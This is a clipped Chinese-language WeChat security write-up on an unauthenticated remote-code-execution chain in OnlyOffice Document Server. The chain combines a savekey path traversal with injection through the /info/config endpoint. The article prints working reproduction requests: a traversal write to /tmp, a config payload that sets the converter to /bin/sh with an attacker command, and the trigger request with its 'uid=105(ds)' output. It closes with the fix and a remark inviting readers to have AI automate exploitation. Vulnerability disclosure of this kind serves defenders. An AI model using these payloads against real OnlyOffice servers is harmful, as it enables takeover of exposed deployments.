---
title: 【微信】【大洞速修】OnlyOffice 前台 RCE 漏洞！
source: https://mp.weixin.qq.com/s/6WztkNCmxPKKkriZVlj4qg
source_host: mp.weixin.qq.com
clip_date: 2026-10-10T12:50:56+08:00
trace_id: d40dd9f7-84ef-43e5-8be4-304826e51ddc
content_hash: c4ff0b729ecc02cc81ab7dd996a53aa04f54e82b35f47065cae182eba2e77c96
status: synced
tags:
  - 微信
  - 漏洞分析
  - 安全工具
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: OnlyOffice Document Server 因 `savekey`/`format`/`id` 路径穿越叠加无认证的 `/info/config` 配置注入，可前台以 `ds` 用户执行任意命令（CNVD-2026-28199，严重）。
ai_summary_style: key-points
images_status:
  total: 10
  succeeded: 10
  failed_urls: []
notion_page_id: 3f575244-d011-8148-a5bc-c6f6729ef8e0
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> OnlyOffice Document Server 因 `savekey`/`format`/`id` 路径穿越叠加无认证的 `/info/config` 配置注入，可前台以 `ds` 用户执行任意命令（CNVD-2026-28199，严重）。
> 
> - **路径穿越成因：** `canvasservice.js` 的 `saveParts()` 把客户端可控 `savekey` 直接拼入存储路径，`storage-fs.js` 的 `getFilePath()` 仅做 `path.join` 且未过滤 `..`，`format`、`id` 同样可污染文件名。
> - **配置注入入口：** 9.0 新增 `POST /info/config`，请求体任意完整 JSON 会被写入 `/var/www/onlyoffice/Data/runtime.json`；默认 `ipfilter.useforrequest=false` 不校验 JWT，仅 nginx 对 `/info` 限 127.0.0.1，直连 8000 或反代转发即可远程触发。
> - **RCE 链路：** FileConverter 每次转换都按 `FileConverter.converter.x2tPath` 启动进程，把该值改为 `/bin/sh`、`args` 改为命令后，靠 runtimeConfigManager 缓存过期热加载（实测约 85 秒）或 supervisord `autorestart=true` 崩溃重启即生效。
> - **实测结果：** `onlyoffice/documentserver:9.0.0` 上任意写文件落盘 `/tmp/pwn_write/Editor1.txt`，注入后转换成功执行 `id`，回显 `uid=105(ds)`。
> - **影响与修复：** 5.0 以上均受影响，9.x 可即时触发；全球约 19.7 万条资产，升级至 9.1.0+（含 `0892841` 修复）即可。

**知攻善防实验室** *2026年10月10日 12:22*

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a16ce33b781f7c8f.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/92e156dd2ee574a4.gif)

前言

经常打攻防的师傅应该经常遇见这个系统，还有很多闭源系统调用了它，所以我觉得这个洞危害还是挺大的。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a5339688a212cecf.png)

漏洞简介

## 漏洞概述

OnlyOffice Document Server 存在路径穿越与配置注入叠加导致的远程代码执行漏洞（CNVD-2026-28199，严重级别）。

1.路径穿越 → 任意目录写文件

DocService/sources/canvasservice.js\` 的 \`saveParts()\` 将客户端可控的 \`savekey\` 直接拼接进存储路径：

```
 yield storage.putObject(ctx, cmd.getSaveKey() + '/' + filename, buffer, buffer.length);
```

## 路径穿越成因

Common/sources/storage/storage-fs.js的getFilePath()直接 path.join(folderPath, strPath)，未过滤 \`..\`；\`format\` 参数亦拼入文件名 \`"Editor." + format\`，同样可控。\`id\` 在 FileConverter 侧作为存储 key（\`key = cmd.savekey? cmd.savekey: cmd.id\`）进入文件路径，同样受影响 —— 与官方排查建议"对 savekey / format / id 禁止.. 与绝对路径"完全对应。

2.配置注入 → 无授权覆写运行时配置

9.0 版本引入管理端点 \`POST /info/config\`，可将请求体（任意完整 JSON）写入运行时配置文件 \*\*\`/var/www/onlyoffice/Data/runtime.json\`\*\*。应用层无任何认证（\`utils.checkClientIp\` 在默认配置 \`ipfilter.useforrequest=false\` 时直接放行，不校验 JWT）；唯一限制是 nginx 默认对 \`/info\` 做 \`allow 127.0.0.1\` 限制（官方配置注释明确说明可注释掉以对外开启 info 页面；直连 8000 端口、反代转发 \`/info\` 的部署均可远程触发）。

## 配置注入到 RCE 链路

RCE 叠加原理： FileConverter 每次转换任务都会通过 \`ctx.getCfg('FileConverter.converter.x2tPath')\` 读取配置并 \`spawnProcess()\` 启动外部程序。攻击者通过配置注入将 \`FileConverter.converter.x2tPath\` 改为 \`/bin/sh\`、\`args\` 改为待执行命令，converter 重启加载新配置后（supervisord \`autorestart=true\`，且进程可被攻击者触发崩溃），任意一次转换即以 \`ds\` 用户执行任意命令。

漏洞影响

ONLYOFFICE Document Server（Docker-DocumentServer）

5.0 以上；9.x 版本可即时触发（\`/info/config\` 为 9.0 引入），其余版本可被动触发

onlyoffice/documentserver:9.0.0\`（Build 168，2025-06-17 构建），确认存在

app:"onlyoffice" 全球约 19.7 万条 / 7.0 万独立 IP；国内约 8.4 万条 / 3.0 万独立 IP

复现过程

环境：本地隔离 Docker，\`docker run -d --name oods -p 9880:80 -e JWT\_ENABLED=false onlyoffice/documentserver:9.0.0\`。

步骤 1：验证路径穿越任意写文件

```bash
POST /downloadas/normal?cmd={"c":"save","id":"probe","format":"txt",
                            "savekey":"../../../../../../tmp/pwn_write"} HTTP/1.1
Content-Type: application/octet-stream
<任意文件内容>
```

响应 {"type":"save","status":"ok",...}服务器上实际落盘 /tmp/pwn_write/Editor1.txt\`，内容为请求体 —— 任意目录写文件成立

```swift
（存储根为 /var/lib/onlyoffice/documentserver/App_Data/cache/files/data`..` 直接逃逸）。
```

步骤 2：配置注入，覆写 runtime.json

```bash
POST /info/config HTTP/1.1
Content-Type: application/octet-stream
{ ...完整 JSON 配置，其中注入：...
  "FileConverter": {"converter": {
      "x2tPath": "/bin/sh",
      "args": "-c id>/tmp/pwned_rce_config_injection"
  }}
}
```

返回 200，/var/www/onlyoffice/Data/runtime.json 被覆写（属主 \`ds\` 可写），注入内容已确认写入文件。

步骤 3：配置生效（无需服务端人工干预）

两种生效方式均已实测：

热加载（无需重启）：converter 的 runtimeConfigManager\`配置缓存 TTL 到期后自动读取被注入的 runtime.json，实测约 85 秒内生效；

重启生效：supervisord autorestart=true，进程崩溃（攻击者可诱发）/容器重启即自动加载新配置（对应"其余版本可被动触发"）。

步骤 4：触发转换，执行任意命令（RCE 实锤）

```bash
POST /downloadas/normal?cmd={"c":"save","id":"rce10","savekey":"rce10",
                            "format":"docx","savetype":2} HTTP/1.1
dummy
```

## 命令执行验证

converter 从队列取出任务后执行 \`spawn("/bin/sh", \["-c", "id>/tmp/pwned\_rce\_config\_injection", params.xml\])\`。查看结果文件：

```bash
$ cat /tmp/pwned_rce_config_injection
uid=105(ds) gid=107(ds) groups=107(ds)
```

命令执行成功，（首次验证时载荷 \`touch\` 因参数切分报 \`touch: missing file operand\`，该报错出现在 converter 日志中，同样独立证明了 shell 被执行。）

环境恢复

还原 runtime.json 中 \`x2tPath\`/\`args\` 为原值，重启 docservice 与 converter，healthcheck 恢复 200，清理全部测试产物。

影响巨大，而且可能会影响业务，这里一键梭哈脚本就不发了，有兴趣可以给 AI 自动化梭哈一下。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/04e2bbcc7ce0221c.png)

修复方式

## 修复方案

升级至 ONLYOFFICE Document Server 9.1.0 或更高版本（含 saveKey 路径穿越修复 \`0892841\` 及 \`/info/config\` 修复）
